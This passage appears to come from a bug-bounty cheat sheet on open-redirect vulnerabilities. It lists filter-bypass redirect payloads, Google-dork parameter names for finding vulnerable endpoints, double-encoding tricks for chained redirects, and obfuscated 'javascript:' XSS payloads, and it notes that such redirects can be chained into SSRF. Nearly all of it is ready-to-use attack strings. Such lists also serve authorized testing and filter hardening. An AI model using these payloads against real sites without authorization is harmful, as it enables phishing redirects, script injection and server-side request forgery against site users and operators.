keep an eye on the 300s status code
1.Below are some of my payloads I use to bypass filters but more importantly used to determine how their filter is working.
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
/\/yoursite.com
https://yoursite.com%3F.theirsite.com/
https://yoursite.com%2523.theirsite.com/
https://yoursite?c=.theirsite.com/ (use # \ also)
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/
https://theirsite.com.mysite.com
/%0D/yoursite.com (Also try %09, %00, %0a, %07)
/%2F/yoururl.com
/%5Cyoururl.com
//google%E3%80%82com

2.Some common words I dork for on google to find vulnerable endpoints: (don't forget to test for upper & lower case!) return, return_url, rUrl, cancelUrl, url, redirect, follow, goto, returnTo, returnUrl, r_url, history, goback, redirectTo, redirectUrl, redirUrl
3.Always encode the last URL value so the browser decodes it last to ensure it is recognised as a valid parameter.
4.Sometimes you will need to double encode them based on how many redirects are made & parameters.
https://example.com/login?return=https://example.com/?redirect=1%26returnurl=https%3A%2F%2Fwww.google.com%2F
https://example.com/login?return=https%3A%2F%2Fexample.com%2F%3Fredirect=1%2526returnurl%3Dhttps%253A%252F%252Fwww.google.com%252F
5.Bear in mind that they can be used for chaining an SSRF vulnerability which is explained more below.
If the redirect you discover is via the “Location:” header then XSS will not be possible, however if it redirected via something like “window.location” then
you should test for “javascript:” instead of redirecting to your website as XSS will be possible here. Some common ways to bypass filters:
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%07script:prompt`0`
java%09scrip%07t:prompt`0`
jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijav
ascriptpjavascriptt:confirm`0
